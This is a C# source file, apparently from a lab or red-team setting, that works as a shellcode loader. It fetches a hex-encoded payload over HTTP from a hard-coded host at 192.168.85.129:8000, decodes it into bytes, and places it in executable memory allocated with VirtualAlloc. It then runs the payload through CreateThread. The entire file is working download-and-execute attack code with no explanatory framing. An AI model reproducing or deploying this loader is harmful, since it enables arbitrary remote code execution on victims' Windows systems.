using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Net;

namespace ShellcodePayload
{
    class Payload
    {
        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress, IntPtr param, UInt32 dwCreationFlags, ref UInt32 lpThreadId);
        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        static void Main()
        {
            //------------- New code start -------------//
            // URL of the payload
            string payloadUrl = "http://192.168.85.129:8000/strings.txt";

            // WebClient is used to download the payload
            // WebClient is used to download the payload
            string payloadWithQuotes;
            using (WebClient client = new WebClient())
            {
                payloadWithQuotes = client.DownloadString(payloadUrl);
            }

            // Remove the leading and trailing quotation marks from the payload string
            string payload = payloadWithQuotes.Trim(new char[] { '"', '\r', '\n' });


            //------------- New code end -------------//

            // The rest of the payload handling remains the same
            string[] X_payload = payload.Split(',');
            byte[] X_Final = new byte[X_payload.Length];

            for (int i = 0; i < X_payload.Length; i++)
            {
                X_Final[i] = Convert.ToByte(X_payload[i], 16);
            }
         
            UInt32 MEM_COMMIT = 0x1000;            
            UInt32 PAGE_EXECUTE_READWRITE = 0x40;

            UInt32 funcAddr = VirtualAlloc(0, (UInt32)X_Final.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(X_Final, 0, (IntPtr)(funcAddr), X_Final.Length);

            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            hThread = CreateThread(0, 0, funcAddr, IntPtr.Zero, 0, ref threadId);
            WaitForSingleObject(hThread, 0xffffffff);
        }
    }
}
